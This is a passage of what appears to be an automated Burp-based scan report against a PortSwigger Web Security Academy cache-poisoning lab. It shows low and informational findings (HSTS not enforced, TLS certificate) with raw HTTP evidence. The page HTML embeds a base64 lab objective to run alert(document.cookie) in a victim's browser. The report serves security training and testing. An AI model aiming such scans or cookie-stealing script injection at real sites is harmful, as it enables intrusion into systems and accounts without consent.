                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/55.jpg"></a>
                        <h2>I'm At A Loss Without It - Leaving Your Smartphone Behind</h2>
                        <p>The other day I left my purse in a friend's car. This led to the most disturbing 19 hours of my life until it was returned to me.</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/50.jpg"></a>
                        <h2>Smart Recognition</h2>
                        <p>The techie folks have done it again. Yet another way to secure your cell, and other electronic gadgets. This Smart Recognition is like no other you've met with yet. It all comes down to the scent of your hair, your...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/8.jpg"></a>
                        <h2>Grandma's on the net</h2>
                        <p>I love old people and technology. I love the language they use, where they have to put the word 'the' in front of everything. The Facebook, The Twitter...the ones I love the most are the ones who show they have...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/62.jpg"></a>
                        <h2>No Silly Names, Please</h2>
                        <p>We hear about it all the time, the unusual names people have given their children. I say unusual to be polite because, to be honest, some of them are just downright ridiculous. Have these parents no idea of the pressure...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/1.jpg"></a>
                        <h2>It's All in the Game - Football for Dummies</h2>
                        <p>There are two types of people in the world; those who watch soccer, and those who watch people watching soccer. I fall into the latter category. If only they'd leave me in peace to drink my beer and zone out....</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/39.jpg"></a>
                        <h2>The Art Of Communication</h2>
                        <p>I'm a bit of a Francophile, so when I travel to France I love to speak their language. I'm by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/53.jpg"></a>
                        <h2>No More Burping Out Loud Guys</h2>
                        <p>One young woman fed up with her workmates burping out loud in the office took matters into her own hands.</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/10.jpg"></a>
                        <h2>I'm A Photoshopped Girl Living In A Photoshopped World</h2>
                        <p>I don't know what I look like anymore. I never use a mirror, I just look at selfies and use the mirror App on my cell. The mirror App is cool, I always look amazing, and I can change my...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/18.jpg"></a>
                        <h2>Protect Your Smart Home Gadgets From Cyber Attacks</h2>
                        <p>While we've been sleeping in beds that don't cook breakfast and having to switch the overhead lights on ourselves, some of the more privileged in our communities have been under attack. A home invasion of a different kind. The attacks...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

<a id="finding-6"></a>

### 6. [LOW] [burp] Strict transport security not enforced (2 URLs)

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

(confidence: CERTAIN) [+1 more URL(s): https://0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/post/comment] @ https://0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/post

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr82ppor-6w` — `artifacts/_/ev-mr82ppor-6w/`

Request:

```http
GET /post HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net

GET /post?postId=1 HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36
Accept: */*
```

Response:

```http
HTTP/1.1 0

HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 14323

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/post?postId=1'/>
        <title>Mystery challenge</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Mystery challenge</h2>
                            <a class=link-back href='https://portswigger.net/web-security/dashboard'>
                                Back&nbsp;to&nbsp;lab&nbsp;dashboard&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                            <br/><div id=mysteryObjective><a id=mysteryReveal data-hidden-objective='VGhlIHZpY3RpbSB1c2VyIHJlZ3VsYXJseSB2aXNpdHMgdGhlIGhvbWUgcGFnZSB1c2luZyBDaHJvbWUuIEludm9rZSA8Y29kZT5hbGVydChkb2N1bWVudC5jb29raWUpPC9jb2RlPiBpbiB0aGVpciBicm93c2VyLg==' data-hidden-link='aHR0cHM6Ly9wb3J0c3dpZ2dlci5uZXQvd2ViLXNlY3VyaXR5L3dlYi1jYWNoZS1wb2lzb25pbmcvZXhwbG9pdGluZy1pbXBsZW1lbnRhdGlvbi1mbGF3cy9sYWItd2ViLWNhY2hlLXBvaXNvbmluZy11bmtleWVkLXF1ZXJ5'>
                                Reveal&nbsp;objective&nbsp;
                            </a></div>
                            <script src='/resources/labheader/js/mysteryObjective.js'></script>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aMystery+challenge%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <div class="blog-post">
                    <img src="/image/blog/posts/39.jpg">
                    <h1>The Art Of Communication</h1>
                    <p><span id=blog-author>Roger That</span> | 16 June 2026</p>
                    <hr>
                    <p>I&apos;m a bit of a Francophile, so when I travel to France I love to speak their language. I&apos;m by no means fluent but I give it my best shot. I usually travel with my partner and son, neither of whom speak French; in fact, it&apos;s almost as though my partner refuses to speak it, he thinks we can all get by on sign language and mime.</p>
                    <p>Neither of my companions understand why I would continue to speak French when the other person is speaking English. I try to explain they want to practice their English in the same way. I speak French and they speak English, and to be honest I probably wouldn&apos;t understand a lot of what they are saying in French, as it is too fast for my comprehension.</p>
                    <p>Asking for directions isn&apos;t too hard, following the answer is, even if you do know your &apos;la gauche&apos; from your &apos;droite&apos;. The easiest option would be to hand them a map and point to your destination, or ask &apos;where am I?&apos; And get them to point at the map. But I think that&apos;s just plain rude, I like to start with a nice salutation and take it from there, even if it doesn&apos;t get me to where I want to go, just smile and wave, smile and wave. In the meantime Mr. Cynical is doing an elaborate dance, arms flailing, finger pointing with the odd preposition throw
```

<a id="finding-7"></a>

### 7. [INFO] [burp] TLS certificate

- Screen: `(cross-screen)`
- Source: validator `burp`
- Scope basis: burp scan (in-scope)

The server presented a valid, trusted TLS certificate. This issue is purely informational.<br><br>The server presented the following certificates:<br><br><h4>Server certificate</h4><table><tr><td><b>Issued to:</b>&nbsp;&nbsp;</td><td>*.web-security-academy.net, *.2.web-security-academy.net, *.1.web-security-academy.net, *.3.web-security-academy.net, *.2.h1-web-security-academy.net, *.1.h1-web-security-academy.net, *.h1-web-security-academy.net, *.3.h1-web-security-academy.net</td></tr><tr><td><b>Issued by:</b>&nbsp;&nbsp;</td><td>Amazon RSA 2048 M01</td></tr><tr><td><b>Valid from:</b>&nbsp;&nb @ https://0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net/

**Reproduction**

```
Detected by Burp. Evidence contains the request/response (Cookie/Authorization redacted).
```

**Evidence**

- Evidence `ev-mr82ppom-6v` — `artifacts/_/ev-mr82ppom-6v/`

Request:

```http
GET / HTTP/1.1
Host: 0aed00ce03a7a9928062cb7000fa003d.web-security-academy.net
```

Response:

```http
HTTP/1.1 0
```
